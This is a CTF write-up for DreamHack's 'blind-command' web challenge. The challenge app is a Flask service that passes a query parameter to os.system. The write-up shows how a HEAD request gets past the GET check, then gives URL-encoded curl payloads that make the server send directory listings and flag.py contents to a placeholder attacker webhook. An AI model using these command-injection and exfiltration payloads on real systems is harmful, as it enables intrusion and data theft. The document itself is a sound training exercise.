# blind-command — DreamHack

> **Room / Challenge:** blind-command (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** blind-command (web)
- **Link**: `https://dreamhack.io/wargame/challenges/73`
- **Level:** `2`
- **Date:** `10-11-2025`

---

## Goal

## My Solution

The app is simple with just one `app.py`:

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```

It is only one route that we can leverage. It needs us to have `cmd` arguments which is executed by `os.system(cmd)` however there is a check:

```python
if request.method == 'GET':
    ''
```

I can bypass this by using the `HEAD` request which is similar to `GET` but helps me bypass this

This is the command that I use to trigger the server to sent the result of command to my host, you may need to have one server that you host to capture the data:

```bash
curl "https://YOUR_SERVER/webhook?c=$(ls -la | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))')"
```

Final command with curl (I url-encoded it to prevent any errors):

```bash
curl -X HEAD "http://host1.dreamhack.games:18775/?cmd=curl%20%22https%3A%2F%2FYOUR_SERVER%2Fwebhook%3Fc%3D%24%28ls%20-la%20%7C%20python3%20-c%20%27import%20urllib.parse%2C%20sys%3B%20print%28urllib.parse.quote%28sys.stdin.read%28%29%29%29%27%29%22"
```

![Guide image](./screenshots/1.png)

Saw a `flag.py`, lets get its content:

```
curl%20%22https%3A%2F%2FYOUR_SERVER%2Fwebhook%3Fc%3D%24%28cat%20flag.py%20%7C%20python3%20-c%20%27import%20urllib.parse%2C%20sys%3B%20print%28urllib.parse.quote%28sys.stdin.read%28%29%29%29%27%29%22
```

![Guide image](./screenshots/2.png)
